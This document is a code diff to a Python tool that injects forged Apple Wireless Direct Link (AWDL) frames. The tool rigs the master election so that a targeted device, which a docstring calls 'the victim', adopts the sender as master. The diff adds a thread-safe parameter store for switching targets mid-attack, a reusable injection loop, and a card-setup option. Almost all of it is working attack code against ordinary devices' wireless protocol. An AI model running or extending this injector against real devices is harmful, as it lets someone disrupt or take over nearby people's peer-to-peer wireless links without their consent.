@@ -50,12 +50,44 @@ Requirements: Linux, Python 3.6+, root, and a Wi-Fi card in monitor mode on
 the right social channel (6, 44 or 149).  No third-party modules needed.
 
 Example:
-    # put the card into monitor mode on channel 44 first, e.g.:
-    #   sudo ip link set wlan0 down
-    #   sudo iw dev wlan0 set type monitor
-    #   sudo ip link set wlan0 up
-    #   sudo iw dev wlan0 set channel 44
+    # Let the tool prepare the card (clean plain monitor + regulatory domain)
+    # and inject in one go:
+    sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44 --setup
+
+    # ...or prepare the card yourself first (see tools/awdl_prepare_stick.sh):
+    #   sudo ./awdl_prepare_stick.sh wlan0 44
     sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44
+
+Integration:
+    The injection loop reads every live parameter (target, source, election
+    counter, channel, ...) from a ``ParamStore`` before building each frame, so
+    other code can drive it by mutating that store instead of restarting it::
+
+        import threading, awdl_master_inject as awdl
+        store = awdl.ParamStore(target=awdl.parse_mac("ff:ff:ff:ff:ff:ff"),
+                                source=awdl.parse_mac("de:ad:be:ef:00:01"),
+                                channel=6, master_metric=awdl.UINT32_MAX,
+                                master_counter=awdl.MASTER_COUNTER_BASE,
+                                self_metric=awdl.UINT32_MAX,
+                                self_counter=awdl.MASTER_COUNTER_BASE,
+                                awdl_version=0xa0, hostname="owl-master",
+                                devclass=awdl.DEVCLASS_NAMES["macos"],
+                                aw_offset=0)
+        sock = awdl.open_injection_socket("wlan0")
+        builder = awdl.AwdlFrameBuilder(src=store.get("source"),
+                                        dst=store.get("target"), channel=6,
+                                        master_metric=awdl.UINT32_MAX,
+                                        master_counter=awdl.MASTER_COUNTER_BASE,
+                                        self_metric=awdl.UINT32_MAX,
+                                        self_counter=awdl.MASTER_COUNTER_BASE,
+                                        hostname="owl-master",
+                                        devclass=awdl.DEVCLASS_NAMES["macos"])
+        stop = threading.Event()
+        threading.Thread(target=awdl.run_injection,
+                         args=(sock, store, builder, "wlan0"),
+                         kwargs=dict(interval=0.11, stop=stop)).start()
+        store.update(target=awdl.parse_mac("66:aa:30:33:93:af"))  # live change
+        stop.set()                                                # and stop
 """
 
 import argparse
@@ -69,6 +101,7 @@ import socket
 import struct
 import subprocess
 import sys
+import threading
 import time
 
 # ---------------------------------------------------------------------------
@@ -484,6 +517,109 @@ class AwdlFrameBuilder:
 
 
 # ---------------------------------------------------------------------------
+# live parameter store ("Zwischenspeicher")
+# ---------------------------------------------------------------------------
+
+class ParamStore:
+    """Thread-safe store of the live injection parameters.
+
+    The injection loop reads a fresh snapshot from this store *before building
+    every frame*, so other code -- another thread or another module that
+    ``import``s this file -- can change the target, source, election counter,
+    channel, ... at runtime and have the very next injected frame pick the new
+    values up.  This is the integration seam: drive the injector by mutating a
+    ``ParamStore`` instead of restarting it.
+
+    All access is guarded by a lock, so updates from another thread are atomic
+    with respect to the snapshot the loop takes.
+
+    Fields:
+        target          destination MAC (6 bytes) the frames are directed at
+        source          source / advertised-master MAC (6 bytes)
+        channel         AWDL social channel (6/44/149); changing it re-tunes
+                        the radio on the next cycle (single-channel mode)
+        master_metric   election master metric (compared second, higher wins)
+        master_counter  election master counter (compared first, higher wins);
+                        advanced automatically every frame to stay "live"
+        self_metric     own metric advertised in the election TLVs
+        self_counter    own counter advertised in the election TLVs
+        awdl_version    Version TLV byte, e.g. 0xa0 for 10.0
+        hostname        hostname advertised in the Arpa TLV (str)
+        devclass        device-class byte (see ``DEVCLASS_NAMES``)
+        aw_offset       availability-window phase offset in TU
+    """
+
+    FIELDS = ("target", "source", "channel", "master_metric", "master_counter",
+              "self_metric", "self_counter", "awdl_version", "hostname",
+              "devclass", "aw_offset")
+
+    def __init__(self, **values):
+        missing = [f for f in self.FIELDS if f not in values]
+        if missing:
+            raise TypeError("ParamStore missing parameter(s): %s"
+                            % ", ".join(missing))
+        unknown = [k for k in values if k not in self.FIELDS]
+        if unknown:
+            raise TypeError("ParamStore got unknown parameter(s): %s"
+                            % ", ".join(unknown))
+        self._lock = threading.Lock()
+        self._v = dict(values)
+
+    def update(self, **values):
+        """Atomically change one or more parameters (call this from any thread)."""
+        unknown = [k for k in values if k not in self.FIELDS]
+        if unknown:
+            raise KeyError("unknown parameter(s): %s" % ", ".join(unknown))
+        with self._lock:
+            self._v.update(values)
+
+    def get(self, key):
+        """Return the current value of one parameter."""
+        with self._lock:
+            return self._v[key]
+
+    def snapshot(self):
+        """Return an atomic copy of all current parameters as a plain dict."""
+        with self._lock:
+            return dict(self._v)
+
+    def advance_counter(self, step, maximum=UINT32_MAX):
+        """Atomically bump the election counters so the master stays "live".
+
+        A frozen counter is detected by the victim as a stale (dead) master, so
+        the loop advances it every frame.  ``self_counter`` is kept in lock-step
+        with ``master_counter``.  Returns the new counter value.
+        """
+        with self._lock:
+            new = min(self._v["master_counter"] + step, maximum)
+            self._v["master_counter"] = new
+            self._v["self_counter"] = new
+            return new
+
+
+def apply_snapshot(builder, snap):
+    """Copy a :class:`ParamStore` snapshot into ``builder``'s live fields.
+
+    The static timing parameters (aw/af period, presence mode) stay on the
+    builder; everything a caller may want to vary per frame comes from ``snap``.
+    The channel is handled by the loop (it has to re-tune the radio), so it is
+    not touched here.
+    """
+    builder.src = snap["source"]
+    builder.dst = snap["target"]
+    builder.master_addr = snap["source"]        # we advertise ourselves master
+    builder.sync_addr = snap["source"]
+    builder.master_metric = snap["master_metric"] & UINT32_MAX
+    builder.master_counter = snap["master_counter"] & UINT32_MAX
+    builder.self_metric = snap["self_metric"] & UINT32_MAX
+    builder.self_counter = snap["self_counter"] & UINT32_MAX
+    builder.awdl_version = snap["awdl_version"] & 0xFF
+    builder.hostname = snap["hostname"]
+    builder.devclass = snap["devclass"]
+    builder.aw_offset = snap["aw_offset"]
+
+
+# ---------------------------------------------------------------------------
 # injection
 # ---------------------------------------------------------------------------
 
@@ -694,6 +830,142 @@ DEVCLASS_NAMES = {
 }
 
 
+def prepare_stick(ifname, regdomain="US", channel=None):
+    """Prepare the Wi-Fi stick for injection via ``awdl_prepare_stick.sh``.
+
+    The companion shell script (shipped next to this file) forces a clean,
+    plain monitor interface -- dropping any stale "active" monitor flag that
+    destabilises USB adapters such as the mt76x0u -- and sets a regulatory
+    domain that permits the 5 GHz AWDL channels.  Returns True on success.
+    """
+    script = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                          "awdl_prepare_stick.sh")
+    if not os.path.exists(script):
+        print("[!] setup: %s not found; cannot prepare the stick" % script)
+        return False
+    # The script takes positional args: <iface> [channel] [regdomain]. Pass an
+    # empty channel placeholder when we do not know it yet (the tool tunes the
+    # channel itself afterwards), so the regdomain still lands in the 3rd slot.
+    cmd = ["sh", script, ifname, "" if channel is None else str(channel), regdomain]
+    print("[*] preparing %s (plain monitor, regdomain %s)" % (ifname, regdomain))
+    try:
+        subprocess.run(cmd, check=True)
+        return True
+    except subprocess.CalledProcessError as exc:
+        print("[!] setup failed (exit %d)" % exc.returncode)
+        return False
+
+
+def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
+                  count=0, psf=False, watch=False, rotate_channels=None,
+                  channel_dwell=CHANNEL_DWELL_DEFAULT,
+                  counter_step=MASTER_COUNTER_STEP, stop=None):
+    """Inject AWDL MIF frames, reading every live parameter from ``store``.
+
+    This is the reusable core of the tool.  Before building each frame it pulls
+    a fresh snapshot from the :class:`ParamStore`, so other code can change the
+    target, source, counter, channel, ... between sends just by mutating the
+    store.  ``main`` uses it for the CLI; an integrator can call it directly::
+
+        stop = threading.Event()
+        threading.Thread(target=run_injection,
+                         args=(sock, store, builder, "wlan0"),
+                         kwargs=dict(interval=0.11, stop=stop)).start()
+        store.update(target=parse_mac("66:aa:30:33:93:af"))  # live change
+        stop.set()                                           # and stop
+
+    Arguments:
+        sock            raw injection socket from ``open_injection_socket``
+        store           the :class:`ParamStore` to read parameters from
+        builder         an :class:`AwdlFrameBuilder` (holds the static timing
+                        fields; its live fields are overwritten each cycle)
+        ifname          interface name, used to re-tune the radio on channel
+                        changes / rotation
+        rotate_channels optional list of channels to rotate across; when it has
+                        more than one entry the rotation owns the channel and
+                        the active channel is written back into the store
+        stop            optional ``threading.Event``; set it to end the loop
+
+    Returns the ``(sent, dropped)`` frame counts.
+    """
+    if stop is None:
+        stop = threading.Event()
+    rotate_channels = list(rotate_channels) if rotate_channels else []
+    multi = len(rotate_channels) > 1
+
+    watch_state = {}
+    last_report = time.monotonic()
+    start = time.monotonic()
+    deadline = start + duration if duration > 0 else None
+    sent = dropped = 0
+    ci = 0
+    current_channel = None
+    next_switch = time.monotonic() + channel_dwell
+
+    while not stop.is_set():
+        # Advance the channel rotation once the dwell on the current one is up.
+        if multi and time.monotonic() >= next_switch:
+            ci = (ci + 1) % len(rotate_channels)
+            next_switch = time.monotonic() + channel_dwell
+
+        snap = store.snapshot()
+
+        # Re-tune the radio when the desired channel changes. In rotation mode
+        # the rotation owns the channel (and the active one is reflected back
+        # into the store); otherwise the store's channel wins.
+        desired = rotate_channels[ci] if multi else snap["channel"]
+        if desired != current_channel:
+            set_channel(ifname, desired)
+            current_channel = desired
+            if multi:
+                store.update(channel=desired)
+
+        apply_snapshot(builder, snap)
+        builder.channel = current_channel
+
+        if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
+            sent += 1
+        else:
+            dropped += 1
+        if psf:
+            if send_frame(sock, builder.build(AWDL_ACTION_PSF)):
+                sent += 1
+            else:
+                dropped += 1
+
+        # keep the master "live": advance the counter so it is never stale
+        store.advance_counter(counter_step, UINT32_MAX)
+
+        if watch:
+            our_src = snap["source"]
+            watch_poll(sock, our_src, watch_state)
+            now = time.monotonic()
+            if now - last_report >= 1.0:
+                watch_report(watch_state, mac_str(our_src))
+                last_report = now
+
+        if count and sent >= count:
+            break
+        if interval <= 0:
+            break
+        if deadline is not None and time.monotonic() >= deadline:
+            break
+
+        # sleep in small slices so the stop flag, the deadline and the channel
+        # switch all stay responsive
+        slept = 0.0
+        while slept < interval and not stop.is_set():
+            if deadline is not None and time.monotonic() >= deadline:
+                break
+            if multi and time.monotonic() >= next_switch:
+                break
+            step = min(0.1, interval - slept)
+            time.sleep(step)
+            slept += step
+
+    return sent, dropped
+
+
 def main(argv=None):
     parser = argparse.ArgumentParser(
         description="Inject AWDL MIF frames that guarantee winning the election "
@@ -774,6 +1046,13 @@ def main(argv=None):
                         help="while injecting, also listen on the same card and "
                              "report which master each AWDL peer advertises "
                              "(shows whether the target adopted you)")
+    parser.add_argument("--setup", action="store_true",
+                        help="prepare the Wi-Fi stick first: force a clean plain "
+                             "monitor interface and set the regulatory domain "
+                             "(runs awdl_prepare_stick.sh; needs root)")
+    parser.add_argument("--regdomain", default="US", metavar="CC",
+                        help="ISO country code for the regulatory domain applied "
+                             "by --setup (default: US, needed for 5 GHz 44/149)")
     parser.add_argument("--dry-run", action="store_true",
                         help="build and hex-dump one frame without injecting")
     args = parser.parse_args(argv)
@@ -811,6 +1090,10 @@ def main(argv=None):
             print("# note: no channel given; using channel %d for --dry-run "
                   "(detection needs a live radio)" % channel)
     else:
+        if args.setup:
+            setup_channel = channel_list[0] if channel_list else None
+            if not prepare_stick(args.interface, args.regdomain, setup_channel):
+                sys.exit("error: could not prepare interface %s" % args.interface)
         sock = open_injection_socket(args.interface)
         have_iw = shutil.which("iw") is not None
         if channel_list is None:
@@ -868,11 +1151,20 @@ def main(argv=None):
     rotate_channels = channel_list
     multi = len(rotate_channels) > 1
 
-    # graceful Ctrl+C
-    stop = {"flag": False}
-    def signal_handler(sig, frame):
-        stop["flag"] = True
-    signal.signal(signal.SIGINT, signal_handler)
+    # The live parameter store ("Zwischenspeicher"): the injection loop reads a
+    # fresh snapshot from it before every frame, so other code can change these
+    # values at runtime. The CLI just seeds it from the parsed arguments.
+    store = ParamStore(
+        target=args.target, source=src, channel=channel,
+        master_metric=metric, master_counter=counter,
+        self_metric=metric, self_counter=counter,
+        awdl_version=args.awdl_version, hostname=args.hostname,
+        devclass=DEVCLASS_NAMES[args.devclass], aw_offset=args.aw_offset,
+    )
+
+    # graceful Ctrl+C -> set the stop event the loop polls
+    stop = threading.Event()
+    signal.signal(signal.SIGINT, lambda *_: stop.set())
 
     chan_str = ",".join(str(c) for c in rotate_channels)
     print("[*] injecting AWDL MIF on %s (ch %s)" % (args.interface, chan_str))
@@ -891,68 +1183,13 @@ def main(argv=None):
         print("    watching   : reporting each AWDL peer's advertised master")
     print("    (Ctrl-C to stop)")
 
-    src_str = mac_str(src)
-    watch_state = {}
-    last_report = time.monotonic()
-
-    start = time.monotonic()
-    deadline = start + args.duration if args.duration > 0 else None
-    sent = 0
-    dropped = 0
-    ci = 0
-    next_switch = time.monotonic() + args.channel_dwell
-    if multi:
-        set_channel(args.interface, rotate_channels[0])
-        builder.channel = rotate_channels[0]
     try:
-        while not stop["flag"]:
-            # Rotate to the next channel once the dwell on the current one is up.
-            if multi and time.monotonic() >= next_switch:
-                ci = (ci + 1) % len(rotate_channels)
-                set_channel(args.interface, rotate_channels[ci])
-                builder.channel = rotate_channels[ci]
-                next_switch = time.monotonic() + args.channel_dwell
-
-            if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
-                sent += 1
-            else:
-                dropped += 1
-            if args.psf:
-                if send_frame(sock, builder.build(AWDL_ACTION_PSF)):
-                    sent += 1
-                else:
-                    dropped += 1
-
-            # keep the master "live": advance the counter so it is never stale
-            builder.master_counter = min(
-                builder.master_counter + MASTER_COUNTER_STEP, UINT32_MAX)
-            builder.self_counter = builder.master_counter
-
-            if args.watch:
-                watch_poll(sock, src, watch_state)
-                now = time.monotonic()
-                if now - last_report >= 1.0:
-                    watch_report(watch_state, src_str)
-                    last_report = now
-
-            if args.count and sent >= args.count:
-                break
-            if args.interval <= 0:
-                break
-            if deadline is not None and time.monotonic() >= deadline:
-                break
-
-            # sleep in small slices so Ctrl+C, the deadline and the channel
-            # switch all stay responsive
-            slept = 0.0
-            while slept < args.interval and not stop["flag"]:
-                if deadline is not None and time.monotonic() >= deadline:
-                    break
-                if multi and time.monotonic() >= next_switch:
-                    break
-                step = min(0.1, args.interval - slept)
-                time.sleep(step)
-                slept += step
+        sent, dropped = run_injection(
+            sock, store, builder, args.interface,
+            interval=args.interval, duration=args.duration, count=args.count,
+            psf=args.psf, watch=args.watch, rotate_channels=rotate_channels,
+            channel_dwell=args.channel_dwell, stop=stop,
+        )
     finally:
         sock.close()
 
